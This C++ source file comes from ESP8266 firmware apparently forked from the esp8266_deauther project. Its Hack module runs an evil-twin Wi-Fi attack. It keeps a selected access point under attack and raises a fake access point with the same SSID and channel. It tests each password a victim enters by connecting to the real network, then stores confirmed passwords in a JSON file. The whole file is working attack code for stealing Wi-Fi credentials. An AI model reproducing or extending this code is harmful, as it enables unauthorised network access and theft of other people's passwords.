/* This software is licensed under the MIT License: https://github.com/spacehuhntech/esp8266_deauther */

#include "Hack.h"

#include "settings.h"
#include "wifi.h"
#include <ESP8266WiFi.h>
#include <LittleFS.h>

Hack::Hack() {
  list = new SimpleList<HackTarget>;
}

void Hack::start() {
    stop();
    accesspoints.sortAfterChannel();
    int apCount = accesspoints.count();
    for (int i = 0; i < apCount; i++) {
      if (accesspoints.getSelected(i)) {
        uint32_t timeout = settings::getAttackSettings().timeout * 1000;
      
        attack.start(false, true, false, false, true, timeout);
        
        String ssid = accesspoints.getSSID(i);
        uint8_t ch = accesspoints.getCh(i);
        String mac = accesspoints.getMacStr(i);

        ct.ssid = ssid;
        ct.mac = mac;
        
        wifi::startHackAP(ssid, ch);
        running = true;
        break;
      }
    }
}

void Hack::stop() {
    if (running) {
        running              = false;
    }
}

bool Hack::isRunning() {
    return running;
}


void Hack::update() {
    if (!running || scan.isScanning()) return;
}

void Hack::load() {
  internal_removeAll();
  DynamicJsonBuffer jsonBuffer(4000);

  checkFile(FILE_PATH, String(OPEN_BRACKET) + String(CLOSE_BRACKET));
  JsonArray& arr = parseJSONFile(FILE_PATH, jsonBuffer);

  for (uint32_t i = 0; i < arr.size() && i < HACK_LIST_SIZE; i++) {
      JsonArray& tmpArray = arr.get<JsonVariant>(i);
      internal_add(tmpArray.get<String>(0), tmpArray.get<String>(1), tmpArray.get<String>(2), tmpArray.get<bool>(3));
  }
}

void Hack::save() {
    String buf = String(OPEN_BRACKET); // [

    if (!writeFile(FILE_PATH, buf)) {
        return;
    }

    buf = String();
    
    int    c = count();

    for (int i = 0; i < c; i++) {

        buf += String(OPEN_BRACKET) + String(DOUBLEQUOTES) + getMac(i) + String(DOUBLEQUOTES) + String(COMMA); // ["00:11:22:00:11:22",
        buf += String(DOUBLEQUOTES) + getSsid(i) + String(DOUBLEQUOTES) + String(COMMA);                     // "vendor",
        buf += String(DOUBLEQUOTES) + getPassword(i) + String(DOUBLEQUOTES) + String(COMMA);                                // "password",
        buf += b2s(getVerified(i)) + String(CLOSE_BRACKET);                                                       // false]

        if (i < c - 1) buf += COMMA;                                                                              // ,

        if (buf.length() >= 1024) {
            if (!appendFile(FILE_PATH, buf)) {
                return;
            }

            buf = String();
        }
    }

    buf += String(CLOSE_BRACKET); // ]

    if (!appendFile(FILE_PATH, buf)) {
        return;
    }
}

void Hack::verifyPassword(String password) {
  if (!running || scan.isScanning()) return;
  
  attack.stop();

  WiFi.mode(WIFI_AP_STA);
  // try connect to WiFi
  WiFi.begin(ct.ssid, password);
  
  uint32_t startTime = millis();
  uint32_t lastUpdate =  startTime;
  uint32_t timeout = settings::getAttackSettings().timeout * 1000;
  
  // wait for connection
  while (WiFi.status() != WL_CONNECTED && lastUpdate - startTime <= CONNECTION_TIMEOUT) {
    attack.start(false, true, false, false, true, timeout);
    delay(1250);
    attack.stop();
    lastUpdate = millis();
  }
  
  // check connection
  if (WiFi.status() == WL_CONNECTED) {
    // update network info
    int lastIdx = internal_checkExist(ct.mac, ct.ssid);

    if (lastIdx != -1) {
      internal_update(lastIdx, password, true);
    }
    else {
      internal_add(ct.mac, ct.ssid, password, true);
    }
    // save to json
    save();
    // stop hacking
    stop();
    // reboot device
    ESP.restart();
  } else {
    attack.start(false, true, false, false, true, timeout);
  }
}

int Hack::count() {
  return list->size();
}

int Hack::internal_checkExist(String mac, String ssid) {
  int n = list->size();
  for (int i = 0; i < n; i++) {
    if (strcmp(list->get(i).mac.c_str(), mac.c_str()) == 0 
              && strcmp(list->get(i).ssid.c_str(), ssid.c_str()) == 0) {
                return i;
    }
  }
  return -1;
}

void Hack::internal_add(String mac, String ssid, String password, bool verified) {
  HackTarget ht;

  ht.mac      = mac;
  ht.ssid = fixUtf8(ssid);
  ht.password = password;
  ht.verified = verified;
  
  list->add(ht);
}

//void Hack::internal_update(int idx, String mac, String ssid, String password, uint32_t lastUpdate, bool verified) {
//  HackTarget ht = list->get(idx);
//
//  ht.mac      = mac;
//  ht.ssid = ssid;
//  ht.password = password;
//  ht.lastUpdate = lastUpdate;
//  ht.verified = verified;
//
//  list->replace(idx, ht);
//}

void Hack::internal_update(int idx, String password, bool verified) {
  HackTarget ht = list->get(idx);
  
  ht.password = password;
  ht.verified = verified;

  list->replace(idx, ht);
}

void Hack::internal_removeAll() {
    list->clear();
}

bool Hack::check(int num) {
    return num >= 0 && num < count();
}

String Hack::getMac(int num) {
    if (!check(num)) return String();

    return list->get(num).mac;
}

String Hack::getSsid(int num) {
  if (!check(num)) return String();

  return list->get(num).ssid;
}
String Hack::getPassword(int num) {
  if (!check(num)) return String();

  return list->get(num).password;
}
bool Hack::getVerified(int num) {
  if (!check(num)) return false;

  return list->get(num).verified;
}

void Hack::remove(int num) {
    if (!check(num)) return;

    internal_remove(num);
    save();
}

void Hack::internal_remove(int num) {
    list->remove(num);
}
